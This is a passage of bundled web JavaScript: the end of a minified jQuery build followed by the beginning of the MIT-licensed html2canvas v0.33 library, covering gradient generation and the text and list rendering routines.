e=f.speed(b,c,d);if(f.isEmptyObject(a))return this.each(e.complete,[!1]);a=f.extend({},a);return e.queue===!1?this.each(g):this.queue(e.queue,g)},stop:function(a,c,d){typeof a!=&#34;string&#34;&amp;&amp;(d=c,c=a,a=b),c&amp;&amp;a!==!1&amp;&amp;this.queue(a||&#34;fx&#34;,[]);return this.each(function(){function h(a,b,c){var e=b[c];f.removeData(a,c,!0),e.stop(d)}var b,c=!1,e=f.timers,g=f._data(this);d||f._unmark(!0,this);if(a==null)for(b in g)g[b]&amp;&amp;g[b].stop&amp;&amp;b.indexOf(&#34;.run&#34;)===b.length-4&amp;&amp;h(this,g,b);else g[b=a+&#34;.run&#34;]&amp;&amp;g[b].stop&amp;&amp;h(this,g,b);for(b=e.length;b--;)e[b].elem===this&amp;&amp;(a==null||e[b].queue===a)&amp;&amp;(d?e[b](!0):e[b].saveState(),c=!0,e.splice(b,1));(!d||!c)&amp;&amp;f.dequeue(this,a)})}}),f.each({slideDown:cu(&#34;show&#34;,1),slideUp:cu(&#34;hide&#34;,1),slideToggle:cu(&#34;toggle&#34;,1),fadeIn:{opacity:&#34;show&#34;},fadeOut:{opacity:&#34;hide&#34;},fadeToggle:{opacity:&#34;toggle&#34;}},function(a,b){f.fn[a]=function(a,c,d){return this.animate(b,a,c,d)}}),f.extend({speed:function(a,b,c){var d=a&amp;&amp;typeof a==&#34;object&#34;?f.extend({},a):{complete:c||!c&amp;&amp;b||f.isFunction(a)&amp;&amp;a,duration:a,easing:c&amp;&amp;b||b&amp;&amp;!f.isFunction(b)&amp;&amp;b};d.duration=f.fx.off?0:typeof d.duration==&#34;number&#34;?d.duration:d.duration in f.fx.speeds?f.fx.speeds[d.duration]:f.fx.speeds._default;if(d.queue==null||d.queue===!0)d.queue=&#34;fx&#34;;d.old=d.complete,d.complete=function(a){f.isFunction(d.old)&amp;&amp;d.old.call(this),d.queue?f.dequeue(this,d.queue):a!==!1&amp;&amp;f._unmark(this)};return d},easing:{linear:function(a,b,c,d){return c+d*a},swing:function(a,b,c,d){return(-Math.cos(a*Math.PI)/2+.5)*d+c}},timers:[],fx:function(a,b,c){this.options=b,this.elem=a,this.prop=c,b.orig=b.orig||{}}}),f.fx.prototype={update:function(){this.options.step&amp;&amp;this.options.step.call(this.elem,this.now,this),(f.fx.step[this.prop]||f.fx.step._default)(this)},cur:function(){if(this.elem[this.prop]!=null&amp;&amp;(!this.elem.style||this.elem.style[this.prop]==null))return this.elem[this.prop];var a,b=f.css(this.elem,this.prop);return isNaN(a=parseFloat(b))?!b||b===&#34;auto&#34;?0:b:a},custom:function(a,c,d){function h(a){return e.step(a)}var e=this,g=f.fx;this.startTime=cr||cs(),this.end=c,this.now=this.start=a,this.pos=this.state=0,this.unit=d||this.unit||(f.cssNumber[this.prop]?&#34;&#34;:&#34;px&#34;),h.queue=this.options.queue,h.elem=this.elem,h.saveState=function(){e.options.hide&amp;&amp;f._data(e.elem,&#34;fxshow&#34;+e.prop)===b&amp;&amp;f._data(e.elem,&#34;fxshow&#34;+e.prop,e.start)},h()&amp;&amp;f.timers.push(h)&amp;&amp;!cp&amp;&amp;(cp=setInterval(g.tick,g.interval))},show:function(){var a=f._data(this.elem,&#34;fxshow&#34;+this.prop);this.options.orig[this.prop]=a||f.style(this.elem,this.prop),this.options.show=!0,a!==b?this.custom(this.cur(),a):this.custom(this.prop===&#34;width&#34;||this.prop===&#34;height&#34;?1:0,this.cur()),f(this.elem).show()},hide:function(){this.options.orig[this.prop]=f._data(this.elem,&#34;fxshow&#34;+this.prop)||f.style(this.elem,this.prop),this.options.hide=!0,this.custom(this.cur(),0)},step:function(a){var b,c,d,e=cr||cs(),g=!0,h=this.elem,i=this.options;if(a||e&gt;=i.duration+this.startTime){this.now=this.end,this.pos=this.state=1,this.update(),i.animatedProperties[this.prop]=!0;for(b in i.animatedProperties)i.animatedProperties[b]!==!0&amp;&amp;(g=!1);if(g){i.overflow!=null&amp;&amp;!f.support.shrinkWrapBlocks&amp;&amp;f.each([&#34;&#34;,&#34;X&#34;,&#34;Y&#34;],function(a,b){h.style[&#34;overflow&#34;+b]=i.overflow[a]}),i.hide&amp;&amp;f(h).hide();if(i.hide||i.show)for(b in i.animatedProperties)f.style(h,b,i.orig[b]),f.removeData(h,&#34;fxshow&#34;+b,!0),f.removeData(h,&#34;toggle&#34;+b,!0);d=i.complete,d&amp;&amp;(i.complete=!1,d.call(h))}return!1}i.duration==Infinity?this.now=e:(c=e-this.startTime,this.state=c/i.duration,this.pos=f.easing[i.animatedProperties[this.prop]](this.state,c,0,1,i.duration),this.now=this.start+(this.end-this.start)*this.pos),this.update();return!0}},f.extend(f.fx,{tick:function(){var a,b=f.timers,c=0;for(;c&lt;b.length;c++)a=b[c],!a()&amp;&amp;b[c]===a&amp;&amp;b.splice(c--,1);b.length||f.fx.stop()},interval:13,stop:function(){clearInterval(cp),cp=null},speeds:{slow:600,fast:200,_default:400},step:{opacity:function(a){f.style(a.elem,&#34;opacity&#34;,a.now)},_default:function(a){a.elem.style&amp;&amp;a.elem.style[a.prop]!=null?a.elem.style[a.prop]=a.now+a.unit:a.elem[a.prop]=a.now}}}),f.each([&#34;width&#34;,&#34;height&#34;],function(a,b){f.fx.step[b]=function(a){f.style(a.elem,b,Math.max(0,a.now)+a.unit)}}),f.expr&amp;&amp;f.expr.filters&amp;&amp;(f.expr.filters.animated=function(a){return f.grep(f.timers,function(b){return a===b.elem}).length});var cw=/^t(?:able|d|h)$/i,cx=/^(?:body|html)$/i;&#34;getBoundingClientRect&#34;in c.documentElement?f.fn.offset=function(a){var b=this[0],c;if(a)return this.each(function(b){f.offset.setOffset(this,a,b)});if(!b||!b.ownerDocument)return null;if(b===b.ownerDocument.body)return f.offset.bodyOffset(b);try{c=b.getBoundingClientRect()}catch(d){}var e=b.ownerDocument,g=e.documentElement;if(!c||!f.contains(g,b))return c?{top:c.top,left:c.left}:{top:0,left:0};var h=e.body,i=cy(e),j=g.clientTop||h.clientTop||0,k=g.clientLeft||h.clientLeft||0,l=i.pageYOffset||f.support.boxModel&amp;&amp;g.scrollTop||h.scrollTop,m=i.pageXOffset||f.support.boxModel&amp;&amp;g.scrollLeft||h.scrollLeft,n=c.top+l-j,o=c.left+m-k;return{top:n,left:o}}:f.fn.offset=function(a){var b=this[0];if(a)return this.each(function(b){f.offset.setOffset(this,a,b)});if(!b||!b.ownerDocument)return null;if(b===b.ownerDocument.body)return f.offset.bodyOffset(b);var c,d=b.offsetParent,e=b,g=b.ownerDocument,h=g.documentElement,i=g.body,j=g.defaultView,k=j?j.getComputedStyle(b,null):b.currentStyle,l=b.offsetTop,m=b.offsetLeft;while((b=b.parentNode)&amp;&amp;b!==i&amp;&amp;b!==h){if(f.support.fixedPosition&amp;&amp;k.position===&#34;fixed&#34;)break;c=j?j.getComputedStyle(b,null):b.currentStyle,l-=b.scrollTop,m-=b.scrollLeft,b===d&amp;&amp;(l+=b.offsetTop,m+=b.offsetLeft,f.support.doesNotAddBorder&amp;&amp;(!f.support.doesAddBorderForTableAndCells||!cw.test(b.nodeName))&amp;&amp;(l+=parseFloat(c.borderTopWidth)||0,m+=parseFloat(c.borderLeftWidth)||0),e=d,d=b.offsetParent),f.support.subtractsBorderForOverflowNotVisible&amp;&amp;c.overflow!==&#34;visible&#34;&amp;&amp;(l+=parseFloat(c.borderTopWidth)||0,m+=parseFloat(c.borderLeftWidth)||0),k=c}if(k.position===&#34;relative&#34;||k.position===&#34;static&#34;)l+=i.offsetTop,m+=i.offsetLeft;f.support.fixedPosition&amp;&amp;k.position===&#34;fixed&#34;&amp;&amp;(l+=Math.max(h.scrollTop,i.scrollTop),m+=Math.max(h.scrollLeft,i.scrollLeft));return{top:l,left:m}},f.offset={bodyOffset:function(a){var b=a.offsetTop,c=a.offsetLeft;f.support.doesNotIncludeMarginInBodyOffset&amp;&amp;(b+=parseFloat(f.css(a,&#34;marginTop&#34;))||0,c+=parseFloat(f.css(a,&#34;marginLeft&#34;))||0);return{top:b,left:c}},setOffset:function(a,b,c){var d=f.css(a,&#34;position&#34;);d===&#34;static&#34;&amp;&amp;(a.style.position=&#34;relative&#34;);var e=f(a),g=e.offset(),h=f.css(a,&#34;top&#34;),i=f.css(a,&#34;left&#34;),j=(d===&#34;absolute&#34;||d===&#34;fixed&#34;)&amp;&amp;f.inArray(&#34;auto&#34;,[h,i])&gt;-1,k={},l={},m,n;j?(l=e.position(),m=l.top,n=l.left):(m=parseFloat(h)||0,n=parseFloat(i)||0),f.isFunction(b)&amp;&amp;(b=b.call(a,c,g)),b.top!=null&amp;&amp;(k.top=b.top-g.top+m),b.left!=null&amp;&amp;(k.left=b.left-g.left+n),&#34;using&#34;in b?b.using.call(a,k):e.css(k)}},f.fn.extend({position:function(){if(!this[0])return null;var a=this[0],b=this.offsetParent(),c=this.offset(),d=cx.test(b[0].nodeName)?{top:0,left:0}:b.offset();c.top-=parseFloat(f.css(a,&#34;marginTop&#34;))||0,c.left-=parseFloat(f.css(a,&#34;marginLeft&#34;))||0,d.top+=parseFloat(f.css(b[0],&#34;borderTopWidth&#34;))||0,d.left+=parseFloat(f.css(b[0],&#34;borderLeftWidth&#34;))||0;return{top:c.top-d.top,left:c.left-d.left}},offsetParent:function(){return this.map(function(){var a=this.offsetParent||c.body;while(a&amp;&amp;!cx.test(a.nodeName)&amp;&amp;f.css(a,&#34;position&#34;)===&#34;static&#34;)a=a.offsetParent;return a})}}),f.each([&#34;Left&#34;,&#34;Top&#34;],function(a,c){var d=&#34;scroll&#34;+c;f.fn[d]=function(c){var e,g;if(c===b){e=this[0];if(!e)return null;g=cy(e);return g?&#34;pageXOffset&#34;in g?g[a?&#34;pageYOffset&#34;:&#34;pageXOffset&#34;]:f.support.boxModel&amp;&amp;g.document.documentElement[d]||g.document.body[d]:e[d]}return this.each(function(){g=cy(this),g?g.scrollTo(a?f(g).scrollLeft():c,a?c:f(g).scrollTop()):this[d]=c})}}),f.each([&#34;Height&#34;,&#34;Width&#34;],function(a,c){var d=c.toLowerCase();f.fn[&#34;inner&#34;+c]=function(){var a=this[0];return a?a.style?parseFloat(f.css(a,d,&#34;padding&#34;)):this[d]():null},f.fn[&#34;outer&#34;+c]=function(a){var b=this[0];return b?b.style?parseFloat(f.css(b,d,a?&#34;margin&#34;:&#34;border&#34;)):this[d]():null},f.fn[d]=function(a){var e=this[0];if(!e)return a==null?null:this;if(f.isFunction(a))return this.each(function(b){var c=f(this);c[d](a.call(this,b,c[d]()))});if(f.isWindow(e)){var g=e.document.documentElement[&#34;client&#34;+c],h=e.document.body;return e.document.compatMode===&#34;CSS1Compat&#34;&amp;&amp;g||h&amp;&amp;h[&#34;client&#34;+c]||g}if(e.nodeType===9)return Math.max(e.documentElement[&#34;client&#34;+c],e.body[&#34;scroll&#34;+c],e.documentElement[&#34;scroll&#34;+c],e.body[&#34;offset&#34;+c],e.documentElement[&#34;offset&#34;+c]);if(a===b){var i=f.css(e,d),j=parseFloat(i);return f.isNumeric(j)?j:i}return this.css(d,typeof a==&#34;string&#34;?a:a+&#34;px&#34;)}}),a.jQuery=a.$=f,typeof define==&#34;function&#34;&amp;&amp;define.amd&amp;&amp;define.amd.jQuery&amp;&amp;define(&#34;jquery&#34;,[],function(){return f})})(window);


/**
  @license html2canvas v0.33 &lt;http://html2canvas.hertzen.com&gt;
  Copyright (c) 2011 Niklas von Hertzen. All rights reserved.
  http://www.twitter.com/niklasvh

  Released under MIT License
 */

(function(window, document, undefined){

/*
  html2canvas v0.33 &lt;http://html2canvas.hertzen.com&gt;
  Copyright (c) 2011 Niklas von Hertzen. All rights reserved.
  http://www.twitter.com/niklasvh

  Released under MIT License
*/

var html2canvas = {};

html2canvas.logging = false;

function h2clog(a) {
    if (html2canvas.logging &amp;&amp; window.console &amp;&amp; window.console.log) {
        window.console.log(a);
    }
}

html2canvas.log = h2clog; // for compatibility with the jquery plugin

html2canvas.Util = {};

html2canvas.Util.backgroundImage = function (src) {
  
    if (/data:image\/.*;base64,/i.test( src ) || /^(-webkit|-moz|linear-gradient|-o-)/.test( src )) {
        return src;
    }
    
    if (src.toLowerCase().substr( 0, 5 ) === &#39;url(&#34;&#39;) {
        src = src.substr( 5 );
        src = src.substr( 0, src.length - 2 );                 
    } else {
        src = src.substr( 4 );
        src = src.substr( 0, src.length - 1 );  
    }

    return src;  
};

html2canvas.Util.Bounds = function getBounds (el) {
    var clientRect,
    bounds = {};
        
    if (el.getBoundingClientRect){	
        clientRect = el.getBoundingClientRect();

            
        // TODO add scroll position to bounds, so no scrolling of window necessary
        bounds.top = clientRect.top;
        bounds.bottom = clientRect.bottom || (clientRect.top + clientRect.height);
        bounds.left = clientRect.left;
        
        // older IE doesn&#39;t have width/height, but top/bottom instead
        bounds.width = clientRect.width || (clientRect.right - clientRect.left);
        bounds.height = clientRect.height || (clientRect.bottom - clientRect.top);
    
        return bounds;
            
    }  /*else{
           
           
            p = $(el).offset();       
          
            return {               
                left: p.left + getCSS(el,&#34;borderLeftWidth&#34;, true),
                top: p.top + getCSS(el,&#34;borderTopWidth&#34;, true),
                width:$(el).innerWidth(),
                height:$(el).innerHeight()                
            };
            

        }     */      
}

html2canvas.Util.getCSS = function (el, attribute) {
    // return jQuery(el).css(attribute);
    /*
    var val,
    left,
    rsLeft = el.runtimeStyle &amp;&amp; el.runtimeStyle[ attribute ],
    style = el.style;
    
    if ( el.currentStyle ) {
        val = el.currentStyle[ attribute ];
    } else if (window.getComputedStyle) {
        val = document.defaultView.getComputedStyle(el, null)[ attribute ];
    }
    */
    // Check if we are not dealing with pixels, (Opera has issues with this)
    // Ported from jQuery css.js
    // From the awesome hack by Dean Edwards
    // http://erik.eae.net/archives/2007/07/27/18.54.15/#comment-102291

    // If we&#39;re not dealing with a regular pixel number
    // but a number that has a weird ending, we need to convert it to pixels
    
    // if ( !/^-?\d+(?:px)?$/i.test( val ) &amp;&amp; /^-?\d/.test( val ) ) {
    /*
        // Remember the original values
        left = style.left;

        // Put in the new values to get a computed value out
        if ( rsLeft ) {
            el.runtimeStyle.left = el.currentStyle.left;
        }
        style.left = attribute === &#34;fontSize&#34; ? &#34;1em&#34; : (val || 0);
        val = style.pixelLeft + &#34;px&#34;;

        // Revert the changed values
        style.left = left;
        if ( rsLeft ) {
            el.runtimeStyle.left = rsLeft;
        }*/
    // val = $(el).css(attribute);
    // }
    
    /*
    var val = $(el).css(attribute);
    
    if (val === &#34;medium&#34;) {
        val = 3;
    }*/
    
    return $(el).css(attribute);
    
  
};

html2canvas.Util.Extend = function (options, defaults) {
    var key;
    for (key in options) {              
        if (options.hasOwnProperty(key)) {
            defaults[key] = options[key];
        }
    }
    return defaults;           
};

html2canvas.Util.Children = function(el) {
    // $(el).contents() !== el.childNodes, Opera / IE have issues with that
    var children;
    try {
      children = $(el).contents();
    } catch (ex) {
      h2clog(&#34;html2canvas.Util.Children failed with exception: &#34; + ex.message);
      children = [];
    }
    return children;
};

/*
  html2canvas v0.33 &lt;http://html2canvas.hertzen.com&gt;
  Copyright (c) 2011 Niklas von Hertzen. All rights reserved.
  http://www.twitter.com/niklasvh

  Released under MIT License
*/

html2canvas.Generate = {};



html2canvas.Generate.Gradient = function(src, bounds) {
    var canvas = document.createElement(&#39;canvas&#39;),
    ctx = canvas.getContext(&#39;2d&#39;),
    tmp, 
    p0 = 0,
    p1 = 0,
    p2 = 0,
    p3 = 0,
    steps = [],
    position,
    i,
    len,
    lingrad,
    increment,
    p,
    img;
    
    canvas.width = bounds.width;
    canvas.height = bounds.height;
    

    function getColors(input) {      
        var j = -1, 
        color = &#39;&#39;, 
        chr;
        
        while( j++ &lt; input.length ) {
            chr = input.charAt( j );
            if (chr === &#39;)&#39;) {
                color += chr;
                steps.push( color );
                color = &#39;&#39;;
                while (j++ &lt; input.length &amp;&amp; input.charAt( j ) !== &#39;,&#39;) {
                }
            } else {
                color += chr;
            }
        }
    }
    
    if ( tmp = src.match(/-webkit-linear-gradient\((.*)\)/) ) {
        
        position = tmp[1].split( &#34;,&#34;, 1 )[0];
        getColors( tmp[1].substr( position.length + 2 ) );
        position = position.split(&#39; &#39;);
        
        for (p = 0; p &lt; position.length; p+=1) {
            
            switch(position[p]) {
                case &#39;top&#39;:
                    p3 = bounds.height;
                    break;
                    
                case &#39;right&#39;:
                    p0 = bounds.width;
                    break;
                    
                case &#39;bottom&#39;:
                    p1 = bounds.height;
                    break;
                    
                case &#39;left&#39;:
                    p2 = bounds.width;
                    break;
            }
            
        }

    } else if (tmp = src.match(/-webkit-gradient\(linear, (\d+)[%]{0,1} (\d+)[%]{0,1}, (\d+)[%]{0,1} (\d+)[%]{0,1}, from\((.*)\), to\((.*)\)\)/)) {
        
        p0 = (tmp[1] * bounds.width) / 100;
        p1 = (tmp[2] * bounds.height) / 100;
        p2 = (tmp[3] * bounds.width) / 100;
        p3 = (tmp[4] * bounds.height) / 100;
        
        steps.push(tmp[5]);
        steps.push(tmp[6]);
        
    } else if (tmp = src.match(/-moz-linear-gradient\((\d+)[%]{0,1} (\d+)[%]{0,1}, (.*)\)/)) {
        
        p0 = (tmp[1] * bounds.width) / 100;
        p1 = (tmp[2] * bounds.width) / 100;
        p2 = bounds.width - p0;
        p3 = bounds.height - p1;
        getColors( tmp[3] );
        
    } else {
        return;
    }

    lingrad = ctx.createLinearGradient( p0, p1, p2, p3 );
    increment = 1 / (steps.length - 1);
    
    for (i = 0, len = steps.length; i &lt; len; i+=1) {
        try {
            lingrad.addColorStop(increment * i, steps[i]);
        }
        catch(e) {
            h2clog([&#39;failed to add color stop: &#39;, e, &#39;; tried to add: &#39;, steps[i], &#39;; stop: &#39;, i, &#39;; in: &#39;, src]);
        }
    }
    
    ctx.fillStyle = lingrad;
    
    // draw shapes
    ctx.fillRect(0, 0, bounds.width,bounds.height);

    img = new Image();
    img.src = canvas.toDataURL();
    
    return img;

}

html2canvas.Generate.ListAlpha = function(number) {
    var tmp = &#34;&#34;,
    modulus;
    
    do {
        modulus = number % 26; 
        tmp = String.fromCharCode((modulus) + 64) + tmp;
        number = number / 26;
    }while((number*26) &gt; 26);
   
    return tmp;  
}

html2canvas.Generate.ListRoman = function(number) {
    var romanArray = [&#34;M&#34;, &#34;CM&#34;, &#34;D&#34;, &#34;CD&#34;, &#34;C&#34;, &#34;XC&#34;, &#34;L&#34;, &#34;XL&#34;, &#34;X&#34;, &#34;IX&#34;, &#34;V&#34;, &#34;IV&#34;, &#34;I&#34;],
    decimal = [1000, 900, 500, 400, 100, 90, 50, 40, 10, 9, 5, 4, 1],
    roman = &#34;&#34;,
    v,
    len = romanArray.length;

    if (number &lt;= 0 || number &gt;= 4000) { 
        return number;
    }
    
    for (v=0; v &lt; len; v+=1) {
        while (number &gt;= decimal[v]) { 
            number -= decimal[v];
            roman += romanArray[v];
        }
    }
        
    return roman;
   
}

/*
  html2canvas v0.33 &lt;http://html2canvas.hertzen.com&gt;
  Copyright (c) 2011 Niklas von Hertzen. All rights reserved.
  http://www.twitter.com/niklasvh

  Released under MIT License
*/

/*
 *  New function for traversing elements
 */

html2canvas.Parse = function (element, images, opts) {
    window.scroll(0,0);
    opts = opts || {};
  
    // select body by default
    if (element === undefined) {
        element = document.body;
    }
    
    
    var support = {
        rangeBounds: false
        
    },
    options = {
        iframeDefault: &#34;default&#34;,
        ignoreElements: &#34;IFRAME|OBJECT|PARAM&#34;,
        useOverflow: true,
        letterRendering: false
    },
    needReorder = false,
    numDraws = 0,
    fontData = {},
    doc = element.ownerDocument,
    ignoreElementsRegExp = new RegExp(&#34;(&#34; + options.ignoreElements + &#34;)&#34;),
    body = doc.body,
    r,
    testElement,
    rangeBounds,
    rangeHeight,
    stack, 
    ctx,
    docDim,
    i,
    children,
    childrenLen;
    
    options = html2canvas.Util.Extend(opts, options);

    images = images || {};
    
    // Test whether we can use ranges to measure bounding boxes
    // Opera doesn&#39;t provide valid bounds.height/bottom even though it supports the method.

    
    if (doc.createRange) {
        r = doc.createRange();
        //this.support.rangeBounds = new Boolean(r.getBoundingClientRect);
        if (r.getBoundingClientRect){
            testElement = doc.createElement(&#39;boundtest&#39;);
            testElement.style.height = &#34;123px&#34;;
            testElement.style.display = &#34;block&#34;;
            body.appendChild(testElement);
            
            r.selectNode(testElement);
            rangeBounds = r.getBoundingClientRect();
            rangeHeight = rangeBounds.height;

            if (rangeHeight === 123) {
                support.rangeBounds = true;
            }
            body.removeChild(testElement);

            
        }
        
    }
    
    
    /*
    var rootStack = new this.storageContext($(document).width(),$(document).height());  
    rootStack.opacity = this.getCSS(this.element,&#34;opacity&#34;);
    var stack = this.newElement(this.element,rootStack);
        
        
    this.parseElement(this.element,stack);  
     */


    function docSize(){

        return {
            width: Math.max(
                Math.max(doc.body.scrollWidth, doc.documentElement.scrollWidth),
                Math.max(doc.body.offsetWidth, doc.documentElement.offsetWidth),
                Math.max(doc.body.clientWidth, doc.documentElement.clientWidth)
                ),
            height: Math.max(
                Math.max(doc.body.scrollHeight, doc.documentElement.scrollHeight),
                Math.max(doc.body.offsetHeight, doc.documentElement.offsetHeight),
                Math.max(doc.body.clientHeight, doc.documentElement.clientHeight)
                )
        };  
        
    }

    var getCSS = html2canvas.Util.getCSS;
    function getCSSInt(element, attribute) {
        var val = parseInt(getCSS(element, attribute), 10);
        return (isNaN(val)) ? 0 : val; // borders in old IE are throwing &#39;medium&#39; for demo.html 
    }

    // Drawing a rectangle
    function renderRect (ctx, x, y, w, h, bgcolor) {
        if (bgcolor !==&#34;transparent&#34;){
            ctx.setVariable(&#34;fillStyle&#34;, bgcolor);
            ctx.fillRect (x, y, w, h);
            numDraws+=1;
        }
    }
    
    
    function textTransform (text, transform) {
        switch(transform){
            case &#34;lowercase&#34;:
                return text.toLowerCase();     
					
            case &#34;capitalize&#34;:
                return text.replace( /(^|\s|:|-|\(|\))([a-z])/g , function (m, p1, p2) {
                    if (m.length &gt; 0) {
                        return p1 + p2.toUpperCase();
                    }
                } );            
					
            case &#34;uppercase&#34;:
                return text.toUpperCase();
                
            default:
                return text;
				
        }
        
    }
    
    function trimText (text) {
        return text.replace(/^\s*/g, &#34;&#34;).replace(/\s*$/g, &#34;&#34;);
    }
    
    function fontMetrics (font, fontSize) {
    
        if (fontData[font + &#34;-&#34; + fontSize] !== undefined) {
            return fontData[font + &#34;-&#34; + fontSize];
        }

    
        var container = doc.createElement(&#39;div&#39;),
        img = doc.createElement(&#39;img&#39;),
        span = doc.createElement(&#39;span&#39;),
        baseline,
        middle,
        metricsObj;
        
        
        container.style.visibility = &#34;hidden&#34;;
        container.style.fontFamily = font;
        container.style.fontSize = fontSize;
        container.style.margin = 0;
        container.style.padding = 0;

        body.appendChild(container);
        


        // http://probablyprogramming.com/2009/03/15/the-tiniest-gif-ever (handtinywhite.gif)
        img.src = &#34;data:image/gif;base64,R0lGODlhAQABAIABAP///wAAACwAAAAAAQABAAACAkQBADs=&#34;;
        img.width = 1;
        img.height = 1;
    
        img.style.margin = 0;
        img.style.padding = 0;
        img.style.verticalAlign = &#34;baseline&#34;;

        span.style.fontFamily = font;
        span.style.fontSize = fontSize;
        span.style.margin = 0;
        span.style.padding = 0;
        
 
    
    
        span.appendChild(doc.createTextNode(&#39;Hidden Text&#39;));
        container.appendChild(span);
        container.appendChild(img);
        baseline = (img.offsetTop - span.offsetTop) + 1;
    
        container.removeChild(span);
        container.appendChild(doc.createTextNode(&#39;Hidden Text&#39;));
    
        container.style.lineHeight = &#34;normal&#34;;
        img.style.verticalAlign = &#34;super&#34;;
        
        middle = (img.offsetTop-container.offsetTop) + 1;
        metricsObj = {
            baseline: baseline,
            lineWidth: 1,
            middle: middle
        };
    
    
        fontData[font + &#34;-&#34; + fontSize] = metricsObj;
        
        body.removeChild(container);

        return metricsObj;
    
    }
    
        
    function drawText(currentText, x, y, ctx){       
        if (trimText(currentText).length&gt;0) {	
            ctx.fillText(currentText,x,y);
            numDraws+=1;
        }           
    }
    
    
    function renderText(el, textNode, stack) {
        var ctx = stack.ctx,
        family = getCSS(el, &#34;fontFamily&#34;),
        size = getCSS(el, &#34;fontSize&#34;),
        color = getCSS(el, &#34;color&#34;),
        text_decoration = getCSS(el, &#34;textDecoration&#34;),
        text_align = getCSS(el, &#34;textAlign&#34;),
        letter_spacing = getCSS(el, &#34;letterSpacing&#34;),
        bounds,
        text,
        metrics,
        renderList,
        bold = getCSS(el, &#34;fontWeight&#34;),
        font_style = getCSS(el, &#34;fontStyle&#34;),
        font_variant = getCSS(el, &#34;fontVariant&#34;),
        align = false,
        newTextNode,
        textValue,
        textOffset = 0,
        oldTextNode,
        c,
        range,
        parent,
        wrapElement,
        backupText;

        // apply text-transform:ation to the text
        
        
        
        textNode.nodeValue = textTransform(textNode.nodeValue, getCSS(el, &#34;textTransform&#34;));
        text = trimText(textNode.nodeValue);
	
        if (text.length&gt;0){
         
            if (text_decoration !== &#34;none&#34;){
                metrics = fontMetrics(family, size);         
            }    
                
            text_align = text_align.replace([&#34;-webkit-auto&#34;],[&#34;auto&#34;]);

            if (options.letterRendering === false &amp;&amp; /^(left|right|justify|auto)$/.test(text_align) &amp;&amp; /^(normal|none)$/.test(letter_spacing)){
                // this.setContextVariable(ctx,&#34;textAlign&#34;,text_align);  
                renderList = textNode.nodeValue.split(/(\b| )/);
           
            }else{
                //  this.setContextVariable(ctx,&#34;textAlign&#34;,&#34;left&#34;);
                renderList = textNode.nodeValue.split(&#34;&#34;);
            }
                     
            switch(parseInt(bold, 10)){
                case 401:
                    bold = &#34;bold&#34;;
                    break;
                case 400:
                    bold = &#34;normal&#34;;
                    break;
            }

            ctx.setVariable(&#34;fillStyle&#34;, color);  
            
            /*
              need to be defined in the order as defined in http://www.w3.org/TR/CSS21/fonts.html#font-shorthand
              to properly work in Firefox
            */     
            ctx.setVariable(&#34;font&#34;, font_style+ &#34; &#34; + font_variant  + &#34; &#34; + bold + &#34; &#34; + size + &#34; &#34; + family);
                              
            if (align){
                ctx.setVariable(&#34;textAlign&#34;, &#34;right&#34;);
            }else{
                ctx.setVariable(&#34;textAlign&#34;, &#34;left&#34;);
            }

        
            /*
        if (stack.clip){
        ctx.rect (stack.clip.left, stack.clip.top, stack.clip.width, stack.clip.height);
        ctx.clip();
        }
             */
       
      
            oldTextNode = textNode;
           
            
            for (c=0; c &lt; renderList.length; c+=1) {
                textValue = null;
    
     
                    
                if (support.rangeBounds){
                    // getBoundingClientRect is supported for ranges
                    if (text_decoration !== &#34;none&#34; || trimText(renderList[c]).length !== 0) {
                        textValue = renderList[c];
                        if (doc.createRange){
                            range = doc.createRange();

                            range.setStart(textNode, textOffset);
                            range.setEnd(textNode, textOffset + textValue.length);
                        }else{
                            // TODO add IE support
                            range = body.createTextRange();
                        }
                        
                        if (range.getBoundingClientRect()) {
                            bounds = range.getBoundingClientRect();
                        }else{
                            bounds = {};
                        }
                        
                    }
                }else{
                    // it isn&#39;t supported, so let&#39;s wrap it inside an element instead and get the bounds there
               
                    // IE 9 bug
                    if (typeof oldTextNode.nodeValue !== &#34;string&#34; ){
                        continue;
                    }
               
                    newTextNode = oldTextNode.splitText(renderList[c].length);
               
                    parent = oldTextNode.parentNode;
                    wrapElement = doc.createElement(&#39;wrapper&#39;);
                    backupText = oldTextNode.cloneNode(true);

                    wrapElement.appendChild(oldTextNode.cloneNode(true));
                    parent.replaceChild(wrapElement, oldTextNode);
                                    
                    bounds = html2canvas.Util.Bounds(wrapElement);
                        
                    textValue = oldTextNode.nodeValue;
                        
                    oldTextNode = newTextNode;
                    parent.replaceChild(backupText, wrapElement);    
                   
                        
                }
            
                if (textValue !== null){
                    drawText(textValue, bounds.left, bounds.bottom, ctx);
                }

                switch(text_decoration) {
                    case &#34;underline&#34;:	
                        // Draws a line at the baseline of the font
                        // TODO As some browsers display the line as more than 1px if the font-size is big, need to take that into account both in position and size         
                        renderRect(ctx, bounds.left, Math.round(bounds.top + metrics.baseline + metrics.lineWidth), bounds.width, 1, color);
                        break;
                    case &#34;overline&#34;:
                        renderRect(ctx, bounds.left, bounds.top, bounds.width, 1, color);
                        break;
                    case &#34;line-through&#34;:
                        // TODO try and find exact position for line-through
                        renderRect(ctx, bounds.left, Math.ceil(bounds.top + metrics.middle + metrics.lineWidth), bounds.width, 1, color);
                        break;
                    
                }	
                
                
            
              
                  
                textOffset += renderList[c].length;
                  
            }
        
         
					
        }
			
    }
    
    function listPosition (element, val) {
        var boundElement = doc.createElement( &#34;boundelement&#34; ),
        type,
        bounds;
        
        boundElement.style.display = &#34;inline&#34;;
        //boundElement.style.width = &#34;1px&#34;;
        //boundElement.style.height = &#34;1px&#34;;
    
        type = element.style.listStyleType;
        element.style.listStyleType = &#34;none&#34;;
    
        boundElement.appendChild( doc.createTextNode( val ) );
    

        element.insertBefore(boundElement, element.firstChild);

    
        bounds = html2canvas.Util.Bounds( boundElement );
        element.removeChild( boundElement );
        element.style.listStyleType = type;
        return bounds;

    }
    
   
    function renderListItem(element, stack, elBounds) {
    
  
        var position = getCSS(element, &#34;listStylePosition&#34;),
        x,
        y,
        type = getCSS(element, &#34;listStyleType&#34;),
        currentIndex,
        text,
        listBounds,
        bold = getCSS(element, &#34;fontWeight&#34;);
    
        if (/^(decimal|decimal-leading-zero|upper-alpha|upper-latin|upper-roman|lower-alpha|lower-greek|lower-latin|lower-roman)$/i.test(type)) {
            
            // TODO remove jQuery dependency
            currentIndex = $(element).index()+1;
            
            switch(type){
                case &#34;decimal&#34;:
                    text = currentIndex;
                    break;
                case &#34;decimal-leading-zero&#34;:
                    if (currentIndex.toString().length === 1){
                        text = currentIndex = &#34;0&#34; + currentIndex.toString();
                    }else{
                        text = currentIndex.toString();   
                    }     
                    break;
                case &#34;upper-roman&#34;:
